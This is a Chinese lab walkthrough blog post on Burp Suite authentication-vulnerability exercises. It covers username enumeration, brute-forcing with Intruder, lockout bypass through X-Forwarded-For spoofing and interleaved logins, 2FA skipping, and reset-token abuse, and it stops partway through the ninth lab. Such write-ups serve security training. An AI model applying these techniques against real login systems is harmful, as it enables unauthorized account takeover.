#  【burpsuite靶场-服务端2】身份认证漏洞-15个实验（全）   
原创 underatted  泷羽Sec-underatted安全   2025-01-28 07:08  
  
# 免责声明：  
  
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我会立即删除并致歉。谢谢！  
# 1. 概念  
  
至少在概念上，身份验证漏洞是最容易理解的问题之一。然而，由于身份验证和安全性之间的明显关系，它们可能是最关键的。  
  
除了潜在地允许攻击者 直接访问敏感数据和功能外，它们还暴露了额外的攻击面 以供进一步利用。因此，学习如何识别 和 利用身份验证漏洞（包括如何绕过常见的保护措施）是一项基本技能。  
  
在本节中，我们将介绍网站使用的一些最常见的身份验证机制，并讨论其中的潜在漏洞。我们将重点介绍不同身份验证机制中的固有漏洞，以及由于实施不当 而引入的一些典型漏洞。  
## 1.1什么是身份验证？  
  
身份验证 是验证给定用户 或 客户端身份的过程。  
  
换句话说，它包括确保他们真的是他们声称的那个人。至少在某种程度上，网站会暴露给 任何连接到互联网的人。因此，健壮的身份验证机制是有效 Web 安全的一个组成部分。  
  
可以将不同类型的身份验证分为三种身份验证因素：  
- 你**知道**  
的东西，例如，密码或安全问题的答案。这些有时被称为 “知识因素” 。  
  
- 你**拥有**  
的东西，例如，手机或安全令牌等物理对象。这些有时被称为 “持有因素” 。  
  
- 你**是**  
谁或做了什么，例如，你的生物特征或行为模式。这些有时被称为 “属性因素” 。  
  
身份验证机制 依赖于一系列技术，来验证其中的一个或多个因素。（单因素 / 多因素身份验证）  
## 1.2身份验证和授权 两者的区别是什么?  
- 身份验证，验证用户是否确实是**他们所声称的身份**  
的过程，  
  
- 授权，验证用户是否**允许执行某些操作**  
。  
  
在网站或 Web 应用程序的上下文中，身份验证尝试确定：使用用户名Carlos123  
访问网站的人，是否真的是创建该帐户的同一个人。  
  
一旦Carlos123  
通过身份验证，他的权限将决定 他是否获得授权，例如，访问其他用户的个人信息 或 执行删除其他用户帐户等操作。  
  
（先认证，后授权）  
## 1.3身份验证漏洞是如何产生的？  
  
一般来说，身份验证机制中的大多数漏洞，会以下面两种方式之一出现：  
- 身份验证机制很弱，因为它们不能充分防范暴力破解攻击。  
  
- 代码实现中的逻辑缺陷 或 糟糕的编码，允许攻击者完全绕过身份验证机制。这有时被称为 “失效的身份验证” 。  
  
在 Web 开发的许多领域，  
逻辑缺陷 (opens new window)  
只会导致网站行为异常，这可能是，也可能不是安全问题。  
  
但是，由于身份验证对安全性至关重要，因此，有缺陷的身份验证逻辑 会使网站面临安全问题的可能性显著增加。  
## 1.4易受攻击的身份验证有什么影响？  
  
身份验证漏洞的影响可能非常严重。  
- 一旦攻击者 绕过身份验证 或 暴力破解 进入另一个用户的帐户，他们就可以访问 受损帐户拥有的所有数据和功能。  
  
- 如果他们能够破坏高特权帐户（如系统管理员），则可以完全控制整个应用程序，并有可能获得对内部基础设施的访问权限。  
  
即使破坏低权限帐户，仍可能授予攻击者 访问他们原本不应该拥有的数据的权限，例如 商业敏感的业务信息。  
  
即使该帐户无权访问任何敏感数据，它仍可能允许攻击者访问其他页面，从而提供进一步的攻击面。通常，某些高严重性攻击，无法从可公开访问的页面进行，但可以从内部页面进行。  
## 1.5身份验证机制中的漏洞  
  
网站的身份验证系统，通常由几个不同的机制组成，这些机制都可能会出现漏洞。有些漏洞广泛适用于所有这些环境，而其他漏洞则更特定于所提供的功能。  
  
我们将更仔细地研究以下领域的 一些最常见的漏洞：  
- 基于密码登录的漏洞 (opens new window)  
实验室  
  
- 多因素身份验证的漏洞 (opens new window)  
实验室  
  
- 其他身份验证机制的漏洞 (opens new window)  
实验室  
  
请注意，一些实验室要求您 枚举用户名 和 暴力破解密码。为了帮助您完成此过程，我们提供了一个  
用户名 (opens new window)  
和  
密码 (opens new window)  
的候选列表，您应该使用这个列表来解决实验室问题。  
## 1.6第三方身份验证机制中的漏洞  
  
如果您喜欢破解身份验证机制，那么在完成我们主要的 身份验证实验室 之后，更高级的用户可能想尝试解决我们的 OAuth 身份验证实验室。  
  
OAuth 身份验证 >>(opens new window)  
## 1.7在你的身份验证机制中防范攻击  
  
我们已经展示了 “网站由于身份验证的脆弱性而容易受到攻击” 的几种方式。  
  
为了降低您自己的网站 遭受此类攻击的风险，您应该始终遵循以下几个一般原则。  
  
阅读更多  
  
如何保护你的身份验证机制 >>  
# 2.靶场  
## 2.1 实验：通过不同的响应枚举用户名  
  
**实验目标：**  
- 列举一个有效的用户名，暴力破解此用户的密码，然后访问其帐户页面。  
  
找到登录页面 然后抓包 只提示用户名错误 那么可以通过分别对用户名和密码分别进行爆破来得到![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSe9p90KtQ13jk5qEZcPl4vlurekyvzMh0ErKZCBoibzpgk8N9Obe0JCw/640?wx_fmt=png&from=appmsg "")  
发送到intruder模块 先择sniper模块 用官方给的字典 对用户名进行爆破  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrShA4wCaNmfyhxPiajvA2fXbp6IniaVVcpjMoDMqvDhLHcnFNU1JE7Nx4g/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSxUb3esgDg2OsVF8G9wfzX5V2aH95ZTgj0icib9iaibJ5diaZjyn5eD5kmKA/640?wx_fmt=png&from=appmsg "")  
有一个包长度最短 并且是302跳转 极有可能是正确的用户名![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSopSzLGXRlKOw5ibfbmBSgDpFxbLRIKtWicsaEmQWe0RJAwv4U6XKoLdw/640?wx_fmt=png&from=appmsg "")  
同理 设置payload导入官方的字典 爆破密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSEfZculbG7sFIqBUkrjLdicOSkFxpOVbbepNIpEsoqfZm379QafzribFA/640?wx_fmt=png&from=appmsg "")  
密码为1234![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSicPStUcHNAwS18CGT5uPo5AnEQYpv7CRFQ2EGZkUHcxM0toBkEGQZpA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSIX6XdDKs3ao0ZflAOplEa1nW8G40YJyu1pibZ0BThg14a2S81SUAFWA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 2.2 实验：通过略有不同的响应进行用户名枚举  
  
同理，也是提示用户名错误，直接爆破用户名，有一个包提示密码错误，那么就得到用户名![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS5f6JoVNaQNPbeDXnrrJBE2JibBAVHWGGvHbFQZ4D6YNCpImB0w5fu8g/640?wx_fmt=png&from=appmsg "")  
爆破密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSZAlbCgxZAzTibZeoiaNZmMUs59JzZy0y3t92gkMu8AEc0Zq9vrmtRZVQ/640?wx_fmt=png&from=appmsg "")  
  
  
登录![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSG25kjC2sMBwEpZzibxw2tPLaqNvsJAD2FBmT8Jg3y7giaO9jiaLKNiaiaibQ/640?wx_fmt=png&from=appmsg "")  
  
## 2.3 实验：2FA简单旁路  
  
给了两个账号  
```
我的账号： `wiener:peter`
目标账号： `carlos:montoya`

```  
  
登录第一个发现需要凭证![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS1r1FStP5T48QygnSbJQ6jZ2WBtHFGiaJkU0z5r12Bx1kXOWwXRCFHibA/640?wx_fmt=png&from=appmsg "")  
  
  
显示错误的用户名和密码 有两步验证![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSuXoRhEOic2ae3XE08f3zCt1dMROr5gnqIljCjiaURKFYiaLxpJw4TDHvQ/640?wx_fmt=png&from=appmsg "")  
设置payload进行爆破，选择pitchfork模式，导入字典![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSjxQQ0KHGq3ZEaFCib1yBlmsEicjV3iatFwMBnFcSDjCTrQ4EYNQcuibHSA/640?wx_fmt=png&from=appmsg "")  
但是爆不出来 界面有一个 Email client 邮箱客户端![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSwq5uDicKOic44fgic32xLeFkYsV9CsYS11cicGvZ1zCoBlSRhJ1SLzHB0w/640?wx_fmt=png&from=appmsg "")  
  
  
里面有邮箱验证码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSRZIRQ5Glz9q7VSOZ5WxicuNXmurDXqPJJ5ricRYVRSwMA7HeAdASZbTQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSRZIRQ5Glz9q7VSOZ5WxicuNXmurDXqPJJ5ricRYVRSwMA7HeAdASZbTQ/640?wx_fmt=png&from=appmsg "")  
回到上一个界面提交四位数验证码 登录成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrStRMDcaH0MI7ZjkAyfNhzzbD5gIPW8P440PXibLeK1PGmt8axVkf80cQ/640?wx_fmt=png&from=appmsg "")  
  
### 绕过邮箱验证码  
  
先退出当前用户，输入受害者的用户名和密码carlos  
:montoya  
，然后进行登录操作。 进入第二个验证步骤，此时，目标应用程序会向carlos  
用户的邮箱发送验证码。 但是我们无法访问该用户的邮箱。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSkkicz1TebqjLj7Qt4IFrz0MicNf8e4iboMwk3IYOwlmRADPSHsCSicp3ZQ/640?wx_fmt=png&from=appmsg "")  
将/login2  
改为/my-account  
，直接访问账户页面，成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSZgLx0gUicmbkfhc5FjfSODLyyeaWPLjT1iaPtwOfVtphZsrq0ZzfiaKcw/640?wx_fmt=png&from=appmsg "")  
  
## 2.4 实验：密码重置逻辑中断  
  
**实验目标：**  
重置carlos的密码，并登录访问  
```
你的证件：`wiener：peter`
受害者的用户名：carlos

```  
  
界面有一个忘记密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS6vDqv7KJQECEcyHu4ZY93AkOZJEWKwAxyxC8aPGM6xZvz93IFj1w7A/640?wx_fmt=png&from=appmsg "")  
  
  
登录wiener![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrScXhcrmDGXb5W3nm9bfSiaibcB3Nww4icCoccxicnxCUbIax9L245PzPU7A/640?wx_fmt=png&from=appmsg "")  
  
  
退出wiener 回到登录界面 点击忘记密码 是通过点击电子邮件的链接来重置密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSvcELgaFKkVqDoXIcJ8sia8xglualA8HuA0x4CHE7VaGjSB3oAMZFKWw/640?wx_fmt=png&from=appmsg "")  
然后查看邮箱点击链接![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSkvb6icVjVhddVR2Rian9Iqcr9BroFufyyAOMJ2l99qYZb5JTOfaI62Ig/640?wx_fmt=png&from=appmsg "")  
重置密码界面 这里有个临时的token![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSE2jdSsXeqby6MGO0k8rlbwShqwiaZOHK1UGicxUOoagYrfnAuqFQAKdg/640?wx_fmt=png&from=appmsg "")  
抓包![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSGbvsjxgZnicFdQnYRt1EXPFiawWJQm079B1MqqIWN6d7WHssKtXwN16Q/640?wx_fmt=png&from=appmsg "")  
将token设置为空也是返回302，说明token并没有用来验证身份![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSjj4S4amIz72XmtSk1dFEmb69dXHonxIJwiaIou7ZwzPB5rjHZAicxDPA/640?wx_fmt=png&from=appmsg "")  
将username改为carlos![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSMjx1ib4U1anGj9JcG46uGmmj1HHVV6d6auEeCMz4GqXyFEgBHiaxQEow/640?wx_fmt=png&from=appmsg "")  
登录成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS6YIOiaqvuTm1GqeiaSkS1wOZ4VsiaHvEpmQvZUqYrOGHWnicR94UBZYgcA/640?wx_fmt=png&from=appmsg "")  
  
## 2.5 实验：通过微妙的不同响应进行枚举  
  
**实验目标**  
： 枚举一个有效的用户名，暴力破解此用户的密码，然后访问其帐户页面。 抓包，响应信息为 Invalid username or password.![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSb1twycs0eNUkgbswZnGDPcy3sWoiczCIJ84KuRQKzJ4xUByKG9gm1jw/640?wx_fmt=png&from=appmsg "")  
  
  
导入字典进行爆破，选择pitchfork模式![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSxic5Clb24BG7I28nbP1WDv6YyLUw8KVWYjCXUxYmnPfTNDyia8a6j5iaQ/640?wx_fmt=png&from=appmsg "")  
  
  
添加匹配响应信息![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSb1twycs0eNUkgbswZnGDPcy3sWoiczCIJ84KuRQKzJ4xUByKG9gm1jw/640?wx_fmt=png&from=appmsg "")  
有一个包的响应信息不匹配（ Invalid username or password ），它的最后一位为空格，不是点，但是没有登录成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSAO2iamRmkRkVr0PBncha50DBJRT3JCBbn8DsvotcDw9XqsEltZuZ7WA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
将密码再单独爆破一次，密码为7777777，账号为at![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSlNqepYV422uUx4yf0GbicsFRM7zVQAhJpFGKoYxV49hwt4Nic2ziaibEFA/640?wx_fmt=png&from=appmsg "")  
登录即可![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSEcsJ1gtcadBte9n62xwicw5dLGsibN49eicBnwV9icfutXEk9HUYuynQibg/640?wx_fmt=png&from=appmsg "")  
  
## 2.6 实验：通过响应时间进行枚举  
  
**实验目标：**  
- 该实验室存在暴力攻击漏洞，但是响应信息完全相同，需要通过程序处理的响应时间进行识别。  
  
- 为了增加难度，该实验室还增加了一种 “基于 IP 的暴力攻击保护”，但很容易绕过。  
  
- 先枚举有效的用户名，再针对该用户名进行密码暴力破解，然后以该用户身份进行登录。**提示：**  
该实验室还实施了一种基于IP的暴力破解保护，但是，这可以通过操纵HTTP请求头来轻松绕过。 正确的账号和密码进行登录，记录正常登录的时间，1s![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSTd60AdPc8rX3DayUq4Mic7GvfQP4ATCM7ZdbTL1m2ibqFiagu9ZTZb0Xw/640?wx_fmt=png&from=appmsg "")  
  
  
正确的账号和错误的密码进行登录，记录时间，0.2s![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSCglInBbWayHibSpYUAujU5qEQz80YXvEzm50wF2b3J5rN5HBDUo2TTQ/640?wx_fmt=png&from=appmsg "")  
  
  
错误的账号和正确的密码进行登录，记录时间，0.2s![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSHFR9piag99VkyUxsZkFjSGFA4xckBFBNn08x74icyLhcC2gib8UQ4hGhg/640?wx_fmt=png&from=appmsg "")  
错误的账号和密码,0.2s，差距都不大![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSxNkUcduhtW415AIuzpAQ7NhLsZ9BFJ1C3DKJZOO3svopRibG7ek4BfA/640?wx_fmt=png&from=appmsg "")  
  
  
对ip有限制![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSo2jOywoEX3wbxuzOTo3NmJvv17UHvXWHqEI4KgaZvtNDkcmFia1rJiaQ/640?wx_fmt=png&from=appmsg "")  
爆破时候加上（X-Forwarded-For:），爆破用户名，选择pitchfork模式，密码长度越长，增加响应时间，特征更明显，便于区分![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSjYP0bj0xEAibuDdg0nuw3MMBgXy6PqVciaYXicQXbl0blCiblNBmu4v86w/640?wx_fmt=png&from=appmsg "")  
  
  
payload 1，120个ip![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSywIphD8GxHOPn3c5GhQAUgic6noibH49E07dLLBOPtkJJqhXLIcKn9ibA/640?wx_fmt=png&from=appmsg "")  
payload 2 导入字典即可![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSEV9z5OAzB6OCadYTubr1g8HpISMNJDsbLfHcaRRxPTJ6oibHRBf3DLA/640?wx_fmt=png&from=appmsg "")  
  
  
匹配响应信息![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSibFAwk6ayThow9rBMYicneTYwZ3ciaLfLAibLzVATmkS5VKk9uS3YJBC5w/640?wx_fmt=png&from=appmsg "")  
在开始攻击前，需要设置响应超时，以此来标记异常的攻击条目。  
- 此处设置为 6 秒，你可以设置更低一点。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSrxb2oPAMPyOJGnADve9OZDfwyjthUQteEiajFmRN744yI9AybUPvwCg/640?wx_fmt=png&from=appmsg "")  
  
  
有一个处理时间明显很长![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSmETlJc9dtrHYJjLeqgEuB9NI1ugibVEvEgRE45hX2Vbuvccibp92WPjw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSYKefxPxjU8aia1jtNEibFSC1fvkn602gzbxymPqKHhuYRyjn9I8MWVHA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSeKREgUXR15nYI2O5OaxFWA7NdQBHtt8QR1emyYzEJnrLcBD8xCuRLQ/640?wx_fmt=png&from=appmsg "")  
爆破成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSVu5kiaVibvBqPpVZVKfc8WHP1Fwcxg4wQl02ibpKaBZHF8on7hibYwnllw/640?wx_fmt=png&from=appmsg "")  
  
## 2.7 实验：破坏蛮力保护，IP块  
  
**实验目标：**  
- 存在暴力破解漏洞，破解密码进行登录。  
  
- 增加了一种“基于IP锁定的暴力攻击保护”，需要尝试绕过。  
  
- 正确的用户名和密码：wiener:peter  
  
- 目标用户名：carlos，需要破解密码登录  
  
多次登录失败会锁定，经过测试，发现是第4次开始锁定，那么登录失败次数最多为3次，可以通过穿插着正确的登录来突破次数限制![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSITia7iaeo5haUYKM00icyEAqiaev5ic74E1MWGsmDX3LrT65HGeAxNUTVicw/640?wx_fmt=png&from=appmsg "")  
  
### 爆破方式一  
  
**构造用户名列表：**  
- 使用wiener和carlos来构造。  
  
- 每隔1个carlos，就放置1个wiener，每爆破1次，就登录一次。  
  
利用python生成字典  
```
for i in range(100):
    print("carlos")
    print("wiener")

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSXRVaO4X6cmljgriaxKicw75wup2JMMpspfaZWXHiadcucHe9Mh8HdXNHA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
**notepad+构造密码列表：**  
- 利用实验室的密码列表以及wiener的密码peter  
  
- 每隔1个密码，就放置1个peter，与用户名列表对应![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSWlibHatnSLXGcbvRT03nT1JiakT6FD1sb1vAhwXPKic8JUjKNiaIl51Yew/640?wx_fmt=png&from=appmsg "")  
抓包，发送到intruder，选择pitchfork模式![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrStuUPoo0dxwTibCU8e4HzCiaKbsDjpCEa1L36rDVy9u9qAr9Ykn2CkadA/640?wx_fmt=png&from=appmsg "")  
  
  
payload 1![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSND5CvVDPsLf1GdvMVI5zItWgwt3jq0EJDgNBMk0QP6o41DT2zcHzMg/640?wx_fmt=png&from=appmsg "")  
  
  
payload 2![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSxUhiaAjJw859IptbpIbAVJz6vFSiaxHhV7L4FfmBfBPuhvWFRMES3X8Q/640?wx_fmt=png&from=appmsg "")  
设置线程![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSTNyggj5lQ9ISFrZiajZAjP4hIZIfQF53jQ16NcTLDw2AqFOiaGkXonag/640?wx_fmt=png&from=appmsg "")  
  
  
前面的靶场过期了，换一个靶场，爆破成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS6DYfkia4Fmibt9vibw7Qeznj9c3ywyibSd9CXMEiateYVjVPvpOIFQjze4Q/640?wx_fmt=png&from=appmsg "")  
  
### 爆破方式二：两个攻击窗口  
  
**（1）攻击窗口一**  
- 选择sniper模式  
  
- 将任意字符添加到任意位置  
  
- 用户名和密码采用正确的wiener：peter![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSjibumDrhAicXHMdI0PLvAEea1eIN9iadAnvgHrEt4DqpofGR2CJQW3WPg/640?wx_fmt=png&from=appmsg "")  
  
  
- 攻击类型为：null payloads  
  
- 数量为500![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSyudgG66cElxzV4iam8CwAwTro3vBlZiakDTI7RkkvWibesnBQof5Gs5Hg/640?wx_fmt=png&from=appmsg "")  
设置攻击速率：  
  
- 线程：3  
  
- 请求间隔：200（毫秒）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSbfsB449eicenicWWwhkicwwySllc8QanF6cQJXrV78VxnJ08gIPXjLeDA/640?wx_fmt=png&from=appmsg "")  
**（2）攻击窗口2**  
- 攻击类型为：Sniper（默认）  
  
- 用户名为carlos  
将密码字段的值 添加到选区 导入实验室提供的 密码列表![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSTZcSoBnkEfSIAiaf1jFDsoYWKnpunMetS8ffGCyfDicQBUNPq9wxrCEQ/640?wx_fmt=png&from=appmsg "")  
设置攻击速率  
  
- 线程：1  
  
- 请求间隔：200（毫秒）![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS8AvmC05ptXVu9MAb8YTckbichUUyWgHFCwHNCJ9zt5ibz8N7B3xeObWg/640?wx_fmt=png&from=appmsg "")  
**开始爆破**  
先启动 窗口1 的攻击（速率快的那个），该窗口会不断发送wiener  
:peter  
的登录请求（一直登录成功）。 在启动 窗口2 的攻击（速率漫的那个），该窗口会不断暴破carlos  
用户的密码（一直失败）。 暴破的速率 较慢，登录成功的速率 较快。 每当暴破失败的次数 接近3次时，都会因登录成功 而刷新为 0 次，这样就能成功绕过 该实验室的防护机制。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSDreYJPOZ2Yc0hpMhzf836gyafsiaqveA4TaBPmD6lViawz91AfPl9rZw/640?wx_fmt=png&from=appmsg "")  
  
  
## 2.8 实验：通过帐户锁定进行枚举  
  
**实验目标：**  
- 该实验室存在暴力攻击漏洞，同时存在 “账户锁定机制” 的保护策略。  
  
- 利用保护策略中的缺陷，来枚举有效的用户名，再针对该用户名进行密码暴力破解，然后以该用户身份进行登录。 尝试登录显示Invalid username or password.![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSetc9icEiaN7dL78vpR4QkqphdrKF3TPqqBwfc2deYywNWfI5GLtB6rOw/640?wx_fmt=png&from=appmsg "")  
先将用户名登录多次，触发账户锁定机制，将密码字典导入5次![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSvAogFo3bC68rnE6ibdbtwicfOo8oByNtblWDoe68Nm9mvNbaKnQ0YFAw/640?wx_fmt=png&from=appmsg "")  
  
  
有一个pi账户异常，序列号为316和417，说明从第3次开始锁定![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSpvzbXc0qQRiabF5PXDXww7V8piazctZ8gXHxOMfibYhffMhWmCkBYmOkw/640?wx_fmt=png&from=appmsg "")  
在该实验室中，当一个账户处于锁定状态：  
- 此时进行登录，如果密码错误，会提示你 账户已被锁定，需要等待 1 分钟。  
  
- 如果密码正确，会返回异常的提示信息。  
  
通过异常的提示信息，来判断密码暴破是否成功。密码暴破成功之后，等待 1 分钟使账户解锁，然后用正确的用户名和密码进行登录，即可完成实验。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSBab7Ot95tLsyvib4XPkZqXveSibjibFicmJnAQiaic4JBbibSFDRKoN3pPHNA/640?wx_fmt=png&from=appmsg "")  
登录成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSLJlWSibYXlXO4FgkKWdzTs0k6NUJWZcJ1ia9Ohs0XEkJkC6I0giaHcLWg/640?wx_fmt=png&from=appmsg "")  
  
## 2.9 实验：2FA逻辑中断  
  
**实验目标：**  
- 该实验室存在双因素身份验证，但该验证可以被绕过。  
  
- 利用双因素身份验证中的缺陷，以 carlos 用户身份进行登录 并访问其账户页面。  
  
正常登录wiener：peter账号**第一个请求包**  
- 传参用户名和密码，请求/login页面  
  
- 响应包302，分配一个cookie，并跳转到/login![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS9QGpDp5Keq2J9YqDXQx5JWbGpYoV2PT1m5dibXXt4SiaZZu5yR5Z4ibqw/640?wx_fmt=png&from=appmsg "")  
  
  
**第二包请求包**  
- 携带刚刚分配的cookie，请求/login2页面  
  
- 应用程序识别到wiener  
用户，向该用户的邮箱发送验证码，然后展示登录页面。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSnriciaw2MO0vBJSjRiaNTq1KQ1CJg6dAeum7ia7WDibGrZuTYT1edmdfOWw/640?wx_fmt=png&from=appmsg "")  
点击上方的 “Email client” 进入 wiener 用户的邮箱客户端。 阅读邮件，获得验证码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS8V0SdH1UMntUhdic8YcXPpbzzeeI3MEhKXmGrP8icAqxXeFlicExJRpAQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
输入邮箱验证码，然后进行登录操作，**第三个请求包**  
- 携带cookie和邮箱验证码，请求/login2页面  
  
